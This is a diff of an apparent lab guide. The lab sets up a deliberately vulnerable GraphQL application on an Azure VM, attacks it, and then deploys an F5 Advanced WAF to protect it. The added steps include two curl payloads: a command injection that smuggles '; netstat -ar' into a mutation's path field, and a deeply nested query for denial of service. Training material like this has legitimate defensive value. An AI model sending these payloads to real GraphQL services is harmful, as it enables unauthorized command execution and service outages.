@@ -214,7 +214,7 @@ az vm open-port -g $rg -n $vm --port 5000
 
   ```
 
-  ** command modifies Neto=work Security Group to allow inbound port 5000
+  ** command modifies Network Security Group to allow inbound port 5000
 
 6. Test application by :
 
@@ -243,18 +243,21 @@ You'll receive this:
 ```
 Please note you tested directly using a GET to http://<YOUR VM PUBLIC IP> 
 
-TRIVIA: what methods are allowes on graphQL? and How many endpoints are used for graphQL operations?
-
+```
+TRIVIA: what methods are allowed   on graphQL? and How many endpoints are used for graphQL operations?
+```
 
 Also use a browser with the same URL and navigate freely on the interface :)
+- Naviagate Private Pastes, Import paste and other left-located tabs
 
-## timestamp 20201112600
+## timestamp 2021112900
 
 5. Now you can start attacking this app :)
 
 
   # Task 3 -  Do some attacks
 
+#### Command Execution
 
 1. Get the IP address of your recently created instance and change the hostname of the next curl request:
 
@@ -265,9 +268,11 @@ curl -g \
 -X POST \
 -H "Content-Type: application/json" \
 -d '{"query":"mutation {importPaste(host:\"localhost\", port:80, path:\"/ ; netstat -ar\", scheme:\"http\"){result}}"}' \
-http://<VM Public IP>/graphql
+http://<VM Public IP>:5000/graphql
 
 ```
+PLEASE DO NOT FORGET PORT 5000
+
 You should get someting like this:
 
 ```
@@ -276,7 +281,32 @@ You should get someting like this:
 
 As you can see, your GraphQL endpoint works and also allows anyone to know internal networking. Not cool.
 
-    try...
-     what else is needed?
+#### Deep Recursion - DoS
+2. 
+
+
+```
+
+curl -g \
+-X POST \
+-H "Content-Type: application/json" \
+-d '{"query":"query {pastes {owner {paste {edges {node {owner {paste {edges {node {owner {paste {edges {node {owner {id}}}}}}}}}}}}}}}"}' \
+http://<VM Public IP>:5000/graphql
+
+  
+  
+
+```
+
+Note the time it takes to answer this single request. This may lead to DoS increasing the number of requests.
   # Task 4 - Deploy F5 Adv WAF to protect GraphQL endpoint
+
+  1. create an instance of Advanced WAF.
+
+  ```
+
+  az vm create -g $rg -n $vm --image "f5-big-ip-advanced-waf" --admin-username "azureuser" --generate-ssh-keys --tags owner[=<YOUR INITIALS>]
+
+
+```
   # Task 5 - Try attacks again and see f5 event log
